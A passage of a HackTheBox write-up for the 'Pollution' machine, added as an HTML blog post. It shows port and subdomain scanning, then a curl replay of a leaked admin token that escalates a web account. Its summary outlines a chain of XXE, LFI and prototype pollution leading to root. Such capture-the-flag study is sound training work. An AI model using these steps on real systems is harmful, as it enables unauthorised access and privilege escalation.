@@ -1,0 +1,1387 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Pollution</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-pollution">htb-pollution</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#redis">redis</a> <a class="post-tag" href="/tags#redis-cli">redis-cli</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#mybb">mybb</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-history-export">burp-history-export</a> <a class="post-tag" href="/tags#xxe">xxe</a> <a class="post-tag" href="/tags#htpasswd">htpasswd</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#lfi">lfi</a> <a class="post-tag" href="/tags#php-filter-injection">php-filter-injection</a> <a class="post-tag" href="/tags#php-fpm">php-fpm</a> <a class="post-tag" href="/tags#fastcgi">fastcgi</a> <a class="post-tag" href="/tags#express">express</a> <a class="post-tag" href="/tags#nodejs">nodejs</a> <a class="post-tag" href="/tags#snyk">snyk</a> <a class="post-tag" href="/tags#prototype-pollution">prototype-pollution</a> <a class="post-tag" href="/tags#htb-updown">htb-updown</a> <a class="post-tag" href="/tags#htb-encoding">htb-encoding</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-07-01T13:45:00+00:00" itemprop="datePublished">Jul 1, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/07/01/htb-pollution.html" style="color: #e6e6e6; text-decoration: none;">HTB: Pollution</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/pollution-cover.webp" type="image/webp"/>
+<img alt="Pollution" class="include_image" loading="lazy" src="/img/pollution-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Pollution starts off with a website where I can find a token in a forum post that has a Burp history export attached. With that token, I can escalate my account to admin, and get access to an endpoint vulnerable to XML external entity (XXE) injection. With that, I’ll read files, including the source code for the site to get access to redis, where I’ll modify my state to get access to the developers site. That site has a PHP local file include (LFI) that I can exploit with filter injection to get code execution. This filter injection technique has become popular, but was relatively unknown at the time of Pollution’s release. I’ll pivot to the next user by exploiting PHP’s FastCGI Process Manager (PHP-FPM), where I’ll get access to the source code for a NodeJS / Express API in development. That API has a prototpye pollution vulnerability, which I can exploit to get execution and a shell as root. In beyond root, I take a quick look at the max length of a URL encountered during the XXE exploit.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/517 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/pollution" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Pollution</a> <a href="https://hackthebox.com/machines/pollution" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-pollution.webp" type="image/webp"/> <img alt="Pollution" class="img-av" src="/icons/box-pollution.png"/></picture></a><br/><a href="https://hackthebox.com/machines/pollution" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1598302315055759360">03 Dec 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">01 Jul 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/pollution-diff.webp" type="image/webp"/><img alt="Rated difficulty for Pollution" src="/img/pollution-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/pollution-radar.webp" type="image/webp"/><img alt="Radar chart for Pollution" src="/img/pollution-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">03:52:43</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:22:51</span><a href="https://app.hackthebox.com/users/2761" rel="noopener" target="_blank"><img alt="lynx" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/2761" style="display: unset"/><span class="user-text" style="display: none"> lynx</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/575442" rel="noopener" target="_blank"><img alt="Tr1s0n" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/575442" style="display: unset"/><span class="user-text" style="display: none"> Tr1s0n</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), HTTP (80), and Redis (6379):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.192
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-27 17:47 EDT
+Nmap scan report for 10.10.11.192
+Host is up (0.093s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6379/tcp open  redis
+
+Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,6379 <span class="nt">-sCV</span> 10.10.11.192
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-27 17:49 EDT
+Nmap scan report for 10.10.11.192
+Host is up (0.093s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Home
+6379/tcp open  redis   Redis key-value store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.debian.org/search?keywords=apache2">Apache</a> versions, the host is likely running Debian 11 bullseye.</p>
+<h3 id="redis---tcp-6379">Redis - TCP 6379</h3>
+<p>I can connect to Redis with <code class="language-plaintext highlighter-rouge">redis-cli</code> (<code class="language-plaintext highlighter-rouge">apt install redis</code>), but it doesn’t let me do anything without auth:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>redis-cli <span class="nt">-h</span> 10.10.11.192
+<span class="go">10.10.11.192:6379&gt; keys *
+(error) NOAUTH Authentication required.
+</span></code></pre></div></div>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The page is a for a company with something about cleaning up pollution:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="/img/image-20230628150658135.png">
+<img alt="image-20230628150658135" src="/img/image-20230628150658135.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="/img/image-20230628150658135.png"><i>Click for full image</i></a></div>
+</div>
+<p>There’s a contact section at the bottom that includes a domain and an email:</p>
+<picture>
+<source srcset="/img/image-20230628150720121.webp" type="image/webp"/>
+<img alt="image-20230628150720121" class="include_image" loading="lazy" src="/img/image-20230628150720121.png"/>
+</picture>
+<p>I’ll register with the registration link and log in, which leads to <code class="language-plaintext highlighter-rouge">/home</code> . This page has a section with information about the API:</p>
+<picture>
+<source srcset="/img/image-20230628150834623.webp" type="image/webp"/>
+<img alt="image-20230628150834623" class="include_image" loading="lazy" src="/img/image-20230628150834623.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>Any entered page address with an extension just redirects to <code class="language-plaintext highlighter-rouge">/</code>. Once logged in, it redirects to <code class="language-plaintext highlighter-rouge">/home</code>. The site is not running PHP or flat HTML, but something else.</p>
+<p>The HTTP response headers don’t give much else besides knowing that the server is Apache:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 18 Oct 2022 13:31:22 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">27777</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.192 <span class="nt">--dont-extract-links</span>
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.192
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      169l      350w     4746c http://10.10.11.192/register
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      169l      350w     4740c http://10.10.11.192/login
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      541l     1413w    26197c http://10.10.11.192/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      313c http://10.10.11.192/assets =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.192/assets/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     60000/60000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:363    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   219/s   http://10.10.11.192/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     30000/30000   0/s     http://10.10.11.192/assets/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go"> (remove </span><span class="feroxbuster-yellow">--dont-extract-links</span><span class="go"> to scan)
+</span></code></pre></div></div>
+<p>In the latest version of <code class="language-plaintext highlighter-rouge">feroxbuster</code>, I’ll typically include <code class="language-plaintext highlighter-rouge">--dont-extract-links</code>, or else it will flood the page with images and other assets from the site that I can get just by examining the source.</p>
+<p>Nothing interesting.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Given the use of domains, I’ll look for subdomains using <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>/opt/ffuf/ffuf <span class="nt">-u</span> http://10.10.11.192 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.collect.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">--mc</span> all <span class="nt">--ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.192
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.collect.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 431ms]
+developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 93ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>It finds <code class="language-plaintext highlighter-rouge">forum.collect.htb</code> and <code class="language-plaintext highlighter-rouge">developers.collect.htb</code>. I’ll add both of those along with <code class="language-plaintext highlighter-rouge">collect.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.192 collect.htb forum.collect.htb developers.collect.htb
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">collect.htb</code> loads the same site as by IP.</p>
+<h3 id="forumcollecthtb">forum.collect.htb</h3>
+<h4 id="site-1">Site</h4>
+<p><code class="language-plaintext highlighter-rouge">forum.collect.htb</code> has a single forum:</p>
+<picture>
+<source srcset="/img/image-20230628151635135.webp" type="image/webp"/>
+<img alt="image-20230628151635135" class="include_image" loading="lazy" src="/img/image-20230628151635135.png"/>
+</picture>
+<p>The “Member List” link gives a list of potential user names:</p>
+<picture>
+<source srcset="/img/image-20230628153831861.webp" type="image/webp"/>
+<img alt="image-20230628153831861" class="include_image" loading="lazy" src="/img/image-20230628153831861.png"/>
+</picture>
+<p>The forum has a bunch of posts:</p>
+<picture>
+<source srcset="/img/image-20230628151652418.webp" type="image/webp"/>
+<img alt="image-20230628151652418" class="include_image" loading="lazy" src="/img/image-20230628151652418.png"/>
+</picture>
+<p>There is information in some of these threads:</p>
+<ul>
+<li>“Forum” says that this is for employees only.</li>
+<li>The “I had problems with the Pollution API” thread has a user complaining that it’s not working. In that thread, they post their Burp History. I’ll want to analyzed that.
+    <picture>
+<source srcset="/img/image-20230628152110282.webp" type="image/webp"/>
+<img alt="image-20230628152110282" class="include_image" loading="lazy" src="/img/image-20230628152110282.png"/>
+</picture>
+</li>
+</ul>
+<p>&lt;/picture&gt;</p>
+<h4 id="burp-history">Burp History</h4>
+<p>If I try to download <code class="language-plaintext highlighter-rouge">proxy_history.txt</code>, it redirects to this page that says I can’t because I’m not logged in:</p>
+<picture>
+<source srcset="/img/image-20230628152713034.webp" type="image/webp"/>
+<img alt="image-20230628152713034" class="include_image" loading="lazy" src="/img/image-20230628152713034.png"/>
+</picture>
+<p>There’s a “Need to register?” link, and once I register, I can download the file.</p>
+<p>The file is XML:</p>
+<picture>
+<source srcset="/img/image-20230628152841126.webp" type="image/webp"/>
+<img alt="image-20230628152841126" class="include_image" loading="lazy" src="/img/image-20230628152841126.png"/>
+</picture>
+<p>The first 24 lines define the structure, and then there’s an <code class="language-plaintext highlighter-rouge">items</code> tag, with ten <code class="language-plaintext highlighter-rouge">item</code> tags in it. an <code class="language-plaintext highlighter-rouge">item</code> looks like:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;item&gt;</span>
+    <span class="nt">&lt;time&gt;</span>Thu Sep 22 18:29:46 BRT 2022<span class="nt">&lt;/time&gt;</span>
+    <span class="nt">&lt;url&gt;</span><span class="cp">&lt;![CDATA[http://detectportal.firefox.com/canonical.html]]&gt;</span><span class="nt">&lt;/url&gt;</span>
+    <span class="nt">&lt;host</span> <span class="na">ip=</span><span class="s">"34.107.221.82"</span><span class="nt">&gt;</span>detectportal.firefox.com<span class="nt">&lt;/host&gt;</span>
+    <span class="nt">&lt;port&gt;</span>80<span class="nt">&lt;/port&gt;</span>
+    <span class="nt">&lt;protocol&gt;</span>http<span class="nt">&lt;/protocol&gt;</span>
+    <span class="nt">&lt;method&gt;</span><span class="cp">&lt;![CDATA[GET]]&gt;</span><span class="nt">&lt;/method&gt;</span>
+    <span class="nt">&lt;path&gt;</span><span class="cp">&lt;![CDATA[/canonical.html]]&gt;</span><span class="nt">&lt;/path&gt;</span>
+    <span class="nt">&lt;extension&gt;</span>html<span class="nt">&lt;/extension&gt;</span>
+    <span class="nt">&lt;request</span> <span class="na">base64=</span><span class="s">"true"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[R0VUIC9jYW5vbmljYWwuaHRtbCBIVFRQLzEuMQ0KSG9zdDogZGV0ZWN0cG9ydGFsLmZpcmVmb3guY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogcHQtQlIscHQ7cT0wLjgsZW4tVVM7cT0wLjUsZW47cT0wLjMNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNClByYWdtYTogbm8tY2FjaGUNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]&gt;</span><span class="nt">&lt;/request&gt;</span>
+    <span class="nt">&lt;status&gt;</span>200<span class="nt">&lt;/status&gt;</span>
+    <span class="nt">&lt;responselength&gt;</span>317<span class="nt">&lt;/responselength&gt;</span>
+    <span class="nt">&lt;mimetype&gt;</span>XML<span class="nt">&lt;/mimetype&gt;</span>
+    <span class="nt">&lt;response</span> <span class="na">base64=</span><span class="s">"true"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IG5naW54DQpDb250ZW50LUxlbmd0aDogOTANClZpYTogMS4xIGdvb2dsZQ0KRGF0ZTogVGh1LCAyMiBTZXAgMjAyMiAwOTowOToyNyBHTVQNCkFnZTogNDQ0NDkNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sDQpDYWNoZS1Db250cm9sOiBwdWJsaWMsbXVzdC1yZXZhbGlkYXRlLG1heC1hZ2U9MCxzLW1heGFnZT0zNjAwDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1odHRwczovL3N1cHBvcnQubW96aWxsYS5vcmcva2IvY2FwdGl2ZS1wb3J0YWwiLz4=]]&gt;</span><span class="nt">&lt;/response&gt;</span>
+    <span class="nt">&lt;comment&gt;&lt;/comment&gt;</span>
+  <span class="nt">&lt;/item&gt;</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">url</code> tag has the url for the request. The <code class="language-plaintext highlighter-rouge">request</code> and <code class="language-plaintext highlighter-rouge">response</code> tags have base64-encoded data that decodes to the request, for example:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/canonical.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">detectportal.firefox.com</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</code></pre></div></div>
+<p>The second <code class="language-plaintext highlighter-rouge">item</code> is a POST request to <code class="language-plaintext highlighter-rouge">http://collect.htb/set/role/admin</code>. The request is:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/set/role/admin</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">collect.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=r8qne20hig1k3li6prgk91t33j</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">38</span>
+
+token=ddac62a28254561001277727cb397baf
+</code></pre></div></div>
+<p>I’ll note both the <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie and the <code class="language-plaintext highlighter-rouge">token</code>.</p>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The bottom says “Powered by MyBB”, which is a <a href="https://mybb.com/">bulletin board software</a> written in PHP. There’s a lot of vulenrabilities in MyBB over time, but they all seem old and don’t match this version.</p>
+<h3 id="developerscollecthtb">developers.collect.htb</h3>
+<p>This site asks for HTTP auth on visiting:</p>
+<picture>
+<source srcset="/img/image-20221018101622894.webp" type="image/webp"/>
+<img alt="image-20221018101622894" class="include_image" loading="lazy" src="/img/image-20221018101622894.png"/>
+</picture>
+<p>Not much else I can do here for now.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="get-admin-access">Get Admin Access</h3>
+<h4 id="set-session-to-admin">Set Session to Admin</h4>
+<p>I’ve got the request from the Burp History showing a request to <code class="language-plaintext highlighter-rouge">/set/role/admin</code> with a token in the POST body. Given that no user is identified, it seems likely that the user who is set as admin is the current user, and perhaps the <code class="language-plaintext highlighter-rouge">token</code> is what gives permission to do that.</p>
+<p>I’ll try that same request, substituting my cookie for the one in the request:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-v</span> http://collect.htb/set/role/admin <span class="nt">-d</span> <span class="nv">token</span><span class="o">=</span>ddac62a28254561001277727cb397baf <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=e0rr38ohgui9v9k7al982bf04d"</span>
+<span class="go">*   Trying 10.10.11.192:80...
+* Connected to collect.htb (10.10.11.192) port 80 (#0)
+&gt; POST /set/role/admin HTTP/1.1
+&gt; Host: collect.htb
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=e0rr38ohgui9v9k7al982bf04d
+&gt; Content-Length: 38
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 302 Found
+&lt; Date: Wed, 28 Jun 2023 19:42:58 GMT
+&lt; Server: Apache/2.4.54 (Debian)
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt; Location: /admin
+&lt; Content-Length: 0
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; 
+* Connection #0 to host collect.htb left intact
+</span></code></pre></div></div>
+<p>The response is a 302 redirect to <code class="language-plaintext highlighter-rouge">/admin</code>, which seems to suggest it worked.</p>
+<h4 id="admin-page">Admin Page</h4>
+<p>The admin page allows for me to register users for the API:</p>
+<picture>
+<source srcset="/img/image-20230628154343272.webp" type="image/webp"/>
+<img alt="image-20230628154343272" class="include_image" loading="lazy" src="/img/image-20230628154343272.png"/>
+</picture>
+<p>On submitting, there’s a background request that’s a POST to <code class="language-plaintext highlighter-rouge">/api</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">collect.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">179</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://collect.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://collect.htb/admin</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=abkgib3l3npk6r1k2rinfn33ns</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+
+manage_api=&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;0xdf&lt;/username&gt;&lt;password&gt;0xdf&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;
+</code></pre></div></div>
+<p>It’s using XML to submit. The response has JSON status:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
